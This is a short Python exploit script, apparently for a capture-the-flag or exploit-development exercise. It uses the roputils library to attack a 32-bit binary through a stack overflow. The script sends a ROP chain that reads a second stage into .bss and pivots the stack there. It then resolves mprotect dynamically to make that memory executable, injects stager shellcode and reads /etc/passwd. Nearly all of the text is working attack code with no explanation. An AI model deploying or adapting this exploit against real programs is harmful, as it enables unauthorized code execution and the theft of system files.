from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
sc = Shellcode('i386')
addr_stage = rop.section('.bss') + 0x800

buf = rop.fill(offset)
buf += rop.call_plt('read', 0, addr_stage, 100)
buf += rop.pivot(addr_stage)

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))

buf = rop.dl_resolve(addr_stage, 'mprotect', addr_stage & ~0xFFF, 0x1000, 7, retaddr=addr_stage+61)
print "[+] offset to shellcode: %d" % len(buf)
buf += sc.get('mmap_stager')
buf += rop.fill(100, buf)

p.write(buf)
p.write(sc.cat('/etc/passwd'))
print p.read(8192)
p.wait()
